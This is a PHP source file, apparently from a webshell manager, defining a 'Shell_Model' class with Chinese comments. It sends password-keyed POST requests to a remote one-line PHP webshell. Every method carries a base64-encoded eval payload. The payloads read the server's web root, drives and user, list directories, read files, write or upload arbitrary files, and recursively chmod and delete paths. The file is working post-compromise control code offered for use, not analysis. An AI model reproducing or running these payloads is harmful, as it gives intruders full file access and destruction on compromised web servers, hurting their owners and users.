<?php
/**
 * WebShell的操作
 *
 * @copyright (c) Emlog All Rights Reserved
 */

class Shell_Model {
	var $Url;
	var $Pass;
	var $ShellType;
	var $Charset;

	function __construct($url,$pass,$type,$Charset="utf-8") {
		$this->Url = $url;
		$this->Pass = $pass;
		$this->ShellType = $type;
		$this->Charset = $Charset;
	}

	//获取返回内容并转换为数组
	function rcontent($payload){
		if($this->ShellType=="PHP"){
			$R = json_decode(getSubstr(do_post_request($this->Url,$payload),"->|","|<-"),true);
		}
		return $R;
	}

	//获取一句话所在目录的绝对路径,和服务器所有盘符
	function GetWebRootPathAndDiskArray(){
		  if($this->ShellType=="PHP"){
		  		$payload = '{PASS}=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOyREPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTtpZigkRD09IiIpeyREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTt9JERpc2tzID0gYXJyYXkoKTtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKXtpZihpc19kaXIoInskTH06IikpJERpc2tzW109InskTH06Ijt9fSR1PShmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldGVnaWQnKSk%2FQHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOicnOyR1c3I9KCR1KT8kdVsnbmFtZSddOkBnZXRfY3VycmVudF91c2VyKCk7JFI9cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7JGFyciA9IGFycmF5KCdXZWJSb290JyA9PiAkRCwgJ0Rpc2tBcnJheScgPT4gJERpc2tzLCdTeXN0ZW1JbmZvJyA9PiAkUik7ZWNobyBqc29uX2VuY29kZSgkYXJyKTtlY2hvKCJ8PC0iKTtkaWUoKTs%3D';
		  		$payload = str_replace("{PASS}",urlencode($this->Pass),$payload);
		  }
		  
		 
		  
		  return $this->rcontent($payload);;
	  }
	  
	  //获取指定目录下的文件列表
	  
	  function GetWebDiskFileList($path){
	  	if($this->ShellType=="PHP"){
	  		$payload = '{PASS}=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2bfCIpOyREPWJhc2U2NF9kZWNvZGUoJF9QT1NUWyJ6MSJdKTskRj1vcGVuZGlyKCREKTsKaWYoJEY9PU5VTEwpe2VjaG8oIkVSUk9SOi8vIFBhdGggTm90IEZvdW5kIE9yIE5vIFBlcm1pc3Npb24hIik7fWVsc2V7JHRtcGFyciA9IGFycmF5KCk7CXdoaWxlKCROPXJlYWRkaXIoJEYpKXskUD0kRC4iLyIuJE47JFQ9ZGF0ZSgiWS1tLWQgSDppOnMiLGZpbGVtdGltZSgkUCkpOyRFPXN1YnN0cihiYXNlX2NvbnZlcnQoZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JGFyciA9IGFycmF5KCd0aW1lJyA9PiAkVCwgJ3NpemUnID0%2bIGZpbGVzaXplKCRQKSwncm9vdCcgPT4gJEUsJ3BhdGgnID0%2bdXJsZW5jb2RlKGlzX2RpcigkUCk%2fJE4uIi8iOiROKSk7JHRtcGFycltdID0gJGFycjt9ZWNobyBqc29uX2VuY29kZSgkdG1wYXJyKTtjbG9zZWRpcigkRik7fTtlY2hvKCJ8PC0iKTtkaWUoKTs%3d&z1={PATH}';
	  		$payload = str_replace("{PASS}",urlencode($this->Pass),$payload);
		    $payload = str_replace("{PATH}",urlencode(base64_encode($path)),$payload);
	  	}
		  
		  return $this->rcontent($payload);
		  //return do_post_request($this->Url,$payload);
	  }
	  
	  //获取指定文件内容
	  
	  function GetWebFileContent($path){
	  	if($this->ShellType=="PHP"){
	  		$payload = '{PASS}=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOyRGPWJhc2U2NF9kZWNvZGUoJF9QT1NUWyJ6MSJdKTskUD1AZm9wZW4oJEYsInIiKTtlY2hvKEBmcmVhZCgkUCxmaWxlc2l6ZSgkRikpKTtAZmNsb3NlKCRQKTs7ZWNobygifDwtIik7ZGllKCk7&z1={PATH}';
		  $payload = str_replace("{PASS}",urlencode($this->Pass),$payload);
		  $payload = str_replace("{PATH}",urlencode(base64_encode($path)),$payload);
	  	}
		  return $this->rcontent($payload);
		  //return do_post_request($this->Url,$payload);
	  }

	  // 创建 修改 上传文件
	  // @param 路径,内容
	  function CreateAndSaveFile($path,$content){
	  	if($this->ShellType=="PHP"){
	  		$payload = '{PASS}=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOztlY2hvIEBmd3JpdGUoZm9wZW4oYmFzZTY0X2RlY29kZSgkX1BPU1RbInoxIl0pLCJ3IiksYmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pKT8iMSI6IjAiOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D&z1={PATH}&z2={Content}';
		  $payload = str_replace("{PASS}",urlencode($this->Pass),$payload);
		  $payload = str_replace("{PATH}",urlencode(base64_encode($path)),$payload);
		  $payload = str_replace("{Content}",urlencode(base64_encode($content)),$payload);
	  	}	

	  	return $this->rcontent($payload);
	  }

	    // 创建 修改 上传文件
	    // @param 路径,内容
	    function DeleteFile($path){
	    	if($this->ShellType=="PHP"){
	    		$payload = '{PASS}=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOztmdW5jdGlvbiBkZigkcCl7JG09QGRpcigkcCk7d2hpbGUoQCRmPSRtLT5yZWFkKCkpeyRwZj0kcC4iLyIuJGY7aWYoKGlzX2RpcigkcGYpKSYmKCRmIT0iLiIpJiYoJGYhPSIuLiIpKXtAY2htb2QoJHBmLDA3NzcpO2RmKCRwZik7fWlmKGlzX2ZpbGUoJHBmKSl7QGNobW9kKCRwZiwwNzc3KTtAdW5saW5rKCRwZik7fX0kbS0%2BY2xvc2UoKTtAY2htb2QoJHAsMDc3Nyk7cmV0dXJuIEBybWRpcigkcCk7fSRGPWdldF9tYWdpY19xdW90ZXNfZ3BjKCk%2Fc3RyaXBzbGFzaGVzKCRfUE9TVFsiejEiXSk6JF9QT1NUWyJ6MSJdO2lmKGlzX2RpcigkRikpZWNobyhkZigkRikpO2Vsc2V7ZWNobyhmaWxlX2V4aXN0cygkRik%2FQHVubGluaygkRik%2FIjEiOiIwIjoiMCIpO307ZWNobygifDwtIik7ZGllKCk7&z1={PATH}';
	  	  $payload = str_replace("{PASS}",urlencode($this->Pass),$payload);
	  	  $payload = str_replace("{PATH}",urlencode($path),$payload);
	    }	

	    return $this->rcontent($payload);
	    }
}
